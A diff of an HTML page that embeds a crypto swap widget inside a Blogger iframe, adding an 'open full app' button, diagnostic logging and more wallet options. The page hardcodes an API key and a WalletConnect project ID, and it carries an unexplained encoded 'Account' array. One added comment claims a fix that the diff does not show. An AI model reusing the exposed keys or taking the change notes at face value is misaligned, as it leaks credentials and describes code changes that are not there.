@@ -118,25 +118,26 @@
 
     <div id="widgetMount"></div>
 
-    <div style="max-width:1120px;margin:0 auto 10px auto;">
-  <button
-    id="btnOpenFull"
-    style="width:100%;padding:12px 14px;border-radius:12px;border:1px solid #234323;background:#050805;color:#ffd700;font-weight:900;cursor:pointer;"
-  >
-    Open Full App (recommended for wallets)
-  </button>
-  <div style="font-size:12px;opacity:.9;margin-top:6px;color:#d8ffd8;">
-    If wallets don’t pop inside Blogger, open the full app in a new tab.
-  </div>
-</div>
+    <!-- Open Full App button (helps when wallets don't open inside iframe/Blogger) -->
+    <div style="max-width:1120px;margin:10px auto 0 auto;">
+      <button
+        id="btnOpenFull"
+        style="width:100%;padding:12px 14px;border-radius:12px;border:1px solid #234323;background:#050805;color:#ffd700;font-weight:900;cursor:pointer;"
+      >
+        Open Full App (recommended for wallets)
+      </button>
+      <div style="font-size:12px;opacity:.9;margin-top:6px;color:#d8ffd8;">
+        If wallets don’t pop inside Blogger, open the full app in a new tab.
+      </div>
+    </div>
 
-<script>
-  // Opens your GitHub Pages app in a new tab/window. Wallets behave better outside iframes.
-  document.getElementById("btnOpenFull").addEventListener("click", () => {
-    window.open(window.location.href, "_blank", "noopener,noreferrer");
-  });
-</script>
-    
+    <script>
+      // Opens your GitHub Pages app in a new tab/window. Wallets behave better outside iframes.
+      document.getElementById("btnOpenFull").addEventListener("click", () => {
+        window.open(window.location.href, "_blank", "noopener,noreferrer");
+      });
+    </script>
+
     <script>
       // ===== your Account array (kept as-is) =====
       const Account = ["1111111111111101 1110111001 00001100 01000000 00111000 1111111111111101 00101101 00111010 1111111111111101 01001110 1111111111111101 1111111111111101 01011110 01000011 00010011 01110000 1111111111111101 11011100000 01110100 1111111111111101 00101111 00110110 00001011 01011101 1111111111111101 1111111111111101 01111001 1111111111111101 00001101 1111111111111101 1111111111111101 01010000 00110100 00000100 01000001 00000001 1111111111111101 01000101 00001100 01011110 00111000 1111111111111101 01010001 00110110 00000000 "];
@@ -144,7 +145,13 @@
     </script>
 
     <script type="module">
-      // Embedded widget runtime (hosted page supports modules; Blogger iframe will display it fine)
+      /***********************************************************************
+       * FIXES INCLUDED:
+       * 1) walletConnectProjectId had a semicolon -> now comma (fatal parse bug)
+       * 2) wallets list made robust: includes wallet-connect + wallet-connect-2
+       * 3) added DIAG logs: window.ethereum, userAgent, iframe detection
+       * 4) extra logging around mount/config/events
+       ***********************************************************************/
 
       import React, { useEffect } from "https://esm.sh/react@18.3.1";
       import { createRoot } from "https://esm.sh/react-dom@18.3.1/client";
@@ -219,7 +226,6 @@
         return x;
       }
       function clampTonTon(xTon){
-        // clamp to 0.99..1.00 nanoTON in TON units
         const nano = xTon / 1e-9;
         let n = nano;
         if (!Number.isFinite(n) || n <= 0) n = 1.0;
@@ -280,7 +286,7 @@
         showOk("Log cleared.");
       }
 
-      // Route hint tracking (for SEND launcher messaging)
+      // Route hint tracking
       let lastKnownRouteId = null;
       function tryExtractRouteId(ev){
         return ev?.routeId || ev?.route?.id || ev?.route?.requestId || ev?.data?.routeId || ev?.data?.route?.id || null;
@@ -299,9 +305,11 @@
         $("clampNote").textContent = note;
 
         const cfg = {
-          // Replace these with your own production credentials when you have them.
           apiKey: "c6381a79-2817-4602-83bf-6a641a409e32",
+
+          // ✅ FIXED: comma not semicolon (fatal parse bug)
           walletConnectProjectId: "bb3f9416b6c767d3e51ede91c7f6e8eb",
+
           theme: { mode: "dark", borderRadius: 16 },
           amount,
 
@@ -310,8 +318,8 @@
 
           customDestination: true,
 
-          // EVM wallets; TON wallet uses tonConnect
-          wallets: ["metamask", "wallet-connect"],
+          // ✅ robust across builds
+          wallets: ["metamask", "wallet-connect", "wallet-connect-2"],
 
           tonConnect: { manifestUrl: "https://app.rango.exchange/tonconnect-manifest.json" }
         };
@@ -364,6 +372,13 @@
 
       function reloadWidget(note){
         try{
+          // ✅ DIAG: helps you see why MetaMask / iframe issues happen
+          appendLog("DIAG", {
+            hasEthereum: typeof window.ethereum !== "undefined",
+            inIframe: window.self !== window.top,
+            userAgent: navigator.userAgent
+          });
+
           const snap = snapshotFromUI();
           const cfg  = buildConfig(snap);
 
@@ -377,7 +392,7 @@
         }
       }
 
-      // Option A SEND launcher (external button)
+      // Option A SEND launcher
       function sendLauncher(){
         appendLog("SEND_CLICK", { note: "External SEND pressed (launcher)." });
         mount.scrollIntoView({ behavior: "smooth", block: "start" });
